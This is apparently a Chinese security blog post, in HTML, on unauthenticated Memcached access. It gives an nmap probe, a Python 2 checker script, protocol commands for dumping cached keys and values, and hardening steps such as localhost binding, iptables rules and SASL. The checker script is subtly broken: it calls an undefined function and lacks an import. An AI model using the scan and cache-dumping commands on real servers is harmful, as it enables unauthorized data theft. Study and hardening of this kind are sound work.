@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Memcache未授权访问一、漏洞简介 memcached是一套分布式的高速缓存系统。它以Key-Value（键值对）形式将数据存储在内存中，这些数据通常是应用读取频繁的。正因为内存中数据的读取远远大于硬盘，因此可以用来加速应用的访问。  二、影响范围三、复现过程1.扫描探测nmap -sV -p 11211 --script memcached-info 0.0.0.0   ##! &#x2F;usr&#x2F;b">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Memcache/Memcache%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Memcache未授权访问一、漏洞简介 memcached是一套分布式的高速缓存系统。它以Key-Value（键值对）形式将数据存储在内存中，这些数据通常是应用读取频繁的。正因为内存中数据的读取远远大于硬盘，因此可以用来加速应用的访问。  二、影响范围三、复现过程1.扫描探测nmap -sV -p 11211 --script memcached-info 0.0.0.0   ##! &#x2F;usr&#x2F;b">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Memcache%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/media/rId25.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Memcache%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/media/rId29.png">
+<meta property="article:published_time" content="2022-07-08T06:25:59.204Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.672Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/Memcache%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/media/rId25.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Memcache/Memcache未授权访问" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Memcache/Memcache%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" class="article-date">
+  <time datetime="2022-07-08T06:25:59.204Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Memcache未授权访问"><a href="#Memcache未授权访问" class="headerlink" title="Memcache未授权访问"></a>Memcache未授权访问</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><blockquote>
+<p>memcached是一套分布式的高速缓存系统。它以Key-Value（键值对）形式将数据存储在内存中，这些数据通常是应用读取频繁的。正因为内存中数据的读取远远大于硬盘，因此可以用来加速应用的访问。</p>
+</blockquote>
+<h2 id="二、影响范围"><a href="#二、影响范围" class="headerlink" title="二、影响范围"></a>二、影响范围</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h4 id="1-扫描探测"><a href="#1-扫描探测" class="headerlink" title="1.扫描探测"></a>1.扫描探测</h4><pre><code>nmap -sV -p 11211 --script memcached-info 0.0.0.0
+</code></pre>
+<p><img src="/resource/Memcache%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/media/rId25.png"></p>
+<pre><code>##! /usr/bin/env python
+## _*_  coding:utf-8 _*_
+def Memcache_check(ip, port=11211, timeout=5):
+    try:
+        socket.setdefaulttimeout(timeout)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((ip, int(port)))
+        s.send(&quot;stats\r\n&quot;)
+        result = s.recv(1024)
+        if &quot;STAT version&quot; in result:
+            print &#39;[+] Memcache Unauthorized: &#39; +ip+&#39;:&#39;+str(port)
+    except Exception, e:
+        pass
+if __name__ == &#39;__main__&#39;:
+    Elasticsearch_check(&quot;127.0.0.1&quot;)
+</code></pre>
+<h4 id="2-攻击利用"><a href="#2-攻击利用" class="headerlink" title="2.攻击利用"></a>2.攻击利用</h4><h5 id="2-1-基础部分"><a href="#2-1-基础部分" class="headerlink" title="2.1 基础部分"></a>2.1 基础部分</h5><p>通过一个cheat<br>sheet了解一下Memcached的协议。Memcached的语法由如下元素组成</p>
+<ul>
+<li>  {COMMAND}0x20{ARGUMENT}(LF|CRLF)</li>
+</ul>
+<p>command字段有如下几条命令</p>
+<ul>
+<li><p>  存储操作(set, add, replace, append, prepend, cas)</p>
+</li>
+<li><p>  检索操作 (get, gets)</p>
+</li>
+<li><p>  删除操作 (delete)</p>
+</li>
+<li><p>  增减操作 (incr, decr)</p>
+</li>
+<li><p>  touch</p>
+</li>
+<li><p>  slabs reassign</p>
+</li>
+<li><p>  slabs automove</p>
+</li>
+<li><p>  lru_crawler</p>
+</li>
+<li><p>  统计操作(stats items, slabs, cachedump)</p>
+</li>
+<li><p>  其他操作 (version, flush_all, quit)</p>
+</li>
+</ul>
+<p>  Command        描述                实例</p>
+<hr>
+<p>  get            读某个值            get mykey<br>  set            强制设置某个键值    set mykey 0 60 5<br>  add            添加新键值对        add newkey 0 60 5<br>  replace        覆盖已经存在的key   replace key 0 60 5<br>  flush_all     让所有条目失效      flush_all<br>  stats          打印当前状态        stats<br>  stats malloc   打印内存状态        stats malloc</p>
+<p>version | 打印Memcached版本 | version</p>
+<pre><code>stats  //查看memcache 服务状态
+stats items  //查看所有items
+stats cachedump 32 0  //获得缓存key
+get :state:264861539228401373:261588   //通过key读取相应value ，获得实际缓存内容，造成敏感信息泄露
+</code></pre>
+<h4 id="2-2-建立连接并获取信息"><a href="#2-2-建立连接并获取信息" class="headerlink" title="2.2 建立连接并获取信息"></a>2.2 建立连接并获取信息</h4><p>telnet 11211，或 nc -vv 11211，无需用户名密码，可以直接连接memcache<br>服务的11211端口。</p>
+<p><img src="/resource/Memcache%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/media/rId29.png"> 附赠大佬写的文章<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2018">Discuz!因Memcached未授权访问导致的RCE</a></p>
+<h4 id="3-防范措施"><a href="#3-防范措施" class="headerlink" title="3.防范措施"></a>3.防范措施</h4><h5 id="1-限制访问"><a href="#1-限制访问" class="headerlink" title="1.限制访问"></a>1.限制访问</h5><p>如果memcache没有对外访问的必要，可在memcached启动的时候指定绑定的ip地址为<br>127.0.0.1。其中 -l 参数指定为本机地址。例如： memcached -d -m 1024 -u<br>root -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid</p>
+<p>或者 vim /etc/sysconfig/memcached，修改配置文件 OPTIONS=&quot;-l<br>127.0.0.1&quot;，只能本机访问，不对公网开放，保存退出 /etc/init.d/memcached<br>reload</p>
+<h5 id="2-防火墙"><a href="#2-防火墙" class="headerlink" title="2.防火墙"></a>2.防火墙</h5><pre><code>// accept
+## iptables -A INPUT -p tcp -s 127.0.0.1 --dport 11211 -j ACCEPT
+## iptables -A INPUT -p udp -s 127.0.0.1 --dport 11211 -j ACCEPT
+
+// drop
+## iptables -I INPUT -p tcp --dport 11211 -j DROP
+## iptables -I INPUT -p udp --dport 11211 -j DROP
+
+// 保存规则并重启 iptables
+## service iptables save
+## service iptables restart
+</code></pre>
+<h5 id="3-使用最小化权限账号运行Memcached服务"><a href="#3-使用最小化权限账号运行Memcached服务" class="headerlink" title="3.使用最小化权限账号运行Memcached服务"></a>3.使用最小化权限账号运行Memcached服务</h5><p>使用普通权限账号运行，指定Memcached用户。</p>
+<pre><code>memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid
+</code></pre>
+<h5 id="4-启用认证功能"><a href="#4-启用认证功能" class="headerlink" title="4.启用认证功能"></a>4.启用认证功能</h5><p>Memcached本身没有做验证访问模块,Memcached从1.4.3版本开始，能支持SASL认证。<a target="_blank" rel="noopener" href="http://www.postfix.org/SASL_README.html?spm=a2c4g.11186623.2.5.RpKdcX##saslauthd">SASL认证详细配置手册</a></p>
+<h5 id="5-修改默认端口"><a href="#5-修改默认端口" class="headerlink" title="5.修改默认端口"></a>5.修改默认端口</h5><p>修改默认11211监听端口为11222端口。在Linux环境中运行以下命令：</p>
+<pre><code>memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11222 -c 1024 -P /tmp/memcached.pid
+</code></pre>
+<h5 id="6-定期升级"><a href="#6-定期升级" class="headerlink" title="6.定期升级"></a>6.定期升级</h5><p>参考:</p>
+<p><a target="_blank" rel="noopener" href="http://lzone.de/cheat-sheet/memcached">http://lzone.de/cheat-sheet/memcached</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/49659.html">https://www.secpulse.com/archives/49659.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.sensepost.com/blog/2010/blackhat-write-up-go-derper-and-mining-memcaches/">https://www.sensepost.com/blog/2010/blackhat-write-up-go-derper-and-mining-memcaches/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf">https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf</a></p>
+<p><a target="_blank" rel="noopener" href="http://niiconsulting.com/checkmate/2013/05/memcache-exploit/">http://niiconsulting.com/checkmate/2013/05/memcache-exploit/</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2018">https://xz.aliyun.com/t/2018</a></p>
+<p><a target="_blank" rel="noopener" href="http://drops.xmd5.com/static/drops/web-8987.html">http://drops.xmd5.com/static/drops/web-8987.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/microzone/article/details/79262549/">https://blog.csdn.net/microzone/article/details/79262549\</a>&lt;</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Memcache/Memcache%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" data-id="cl5c2qrs500aty8v1bos01qoc" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/MessageSolution/MessageSolution%20%E9%82%AE%E4%BB%B6%E5%BD%92%E6%A1%A3%E7%B3%BB%E7%BB%9FEEA%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CNVD-2021-10543/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Mariadb/%EF%BC%88CVE-2020-7221%EF%BC%89Mariadb%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
